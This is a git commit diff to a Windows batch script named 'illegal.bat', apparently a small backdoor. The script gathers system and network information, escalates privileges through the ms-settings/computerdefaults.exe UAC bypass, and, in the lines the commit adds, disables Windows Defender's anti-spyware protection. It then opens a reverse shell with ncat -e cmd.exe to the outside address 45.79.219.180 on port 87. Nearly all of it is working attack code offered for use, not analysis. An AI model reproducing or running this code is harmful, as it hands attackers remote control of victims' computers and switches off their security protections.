5a367fc6ee2648ba94dde13d99ed8d4cc88d84fd
ʀᴠɢ || ɴɪᴋᴇɪꜱꜰᴀᴋᴇ <154763316+RVG-Nikeisfake0@users.noreply.github.com>
2024-02-16 13:04:13 +0100

    Update illegal.bat

--- illegal.bat
+++ illegal.bat
@@ -1,4 +1,7 @@
 cd %temp%
 echo systeminfo > cmds.bat & echo ipconfig /all >> cmds.bat & echo cd %systemroot%\System32 >> cmds.bat & echo color 02 >> cmds.bat & echo cls >> cmds.bat & echo cmd >> cmds.bat
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-if '%errorlevel%' NEQ '0' (reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "%~dpnx0" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && start computerdefaults.exe) else (ncat.exe -e "cmd.exe /k %temp%\cmds.bat" 45.79.219.180 87)
+if '%errorlevel%' NEQ '0' (reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "%~dpnx0" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && start computerdefaults.exe) else (goto yes)
+:yes
+reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
+ncat.exe -e "cmd.exe /k %temp%\cmds.bat" 45.79.219.180 87
